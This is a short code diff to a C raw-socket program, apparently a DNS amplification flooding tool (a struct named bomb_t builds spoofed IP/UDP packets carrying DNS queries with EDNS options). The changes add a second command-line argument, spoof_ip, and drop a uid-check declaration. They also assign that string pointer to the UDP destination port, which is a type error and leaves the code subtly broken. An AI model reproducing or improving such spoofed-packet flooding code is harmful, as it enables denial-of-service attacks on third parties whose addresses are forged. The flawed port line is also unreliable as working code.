@@ -20,7 +20,7 @@
 
 /* Initialize global varible */
 char *spoof_address;
-
+char *spoof_ip;
 
 /* All the structure */
 typedef struct {
@@ -69,9 +69,6 @@ typedef struct {
     DNS_query *query;
     DNS_opt *opt;
 } bomb_t;
-
-
-void check_uid();
 
 /* net stuff */
 bomb_t *create_rawsock(bomb_t *);
@@ -159,7 +156,7 @@ bomb_t *build_udp_header(bomb_t *bomb)
     bomb->udp = (struct udphdr *) (bomb->packet + sizeof(struct iphdr));
 
     bomb->udp->source = htons(rand());
-    bomb->udp->dest = htons(DEFAULT_DNS_PORT);
+    bomb->udp->dest = htons(spoof_ip);
     bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_opt) + sizeof(DNS_query) + strlen(DEFAULT_DOMAIN) + 1);
     bomb->udp->check = 0;
 
@@ -296,7 +293,10 @@ int main(int argc, char **argv)
     unsigned int i = 0;
 
     printf("%s\n", argv[1]);
+
     spoof_address = argv[1];
+    spoof_ip = argv[2];
+
     printf("%s\n", spoof_address);
 
     for (i = 0; i < 10; i++) {
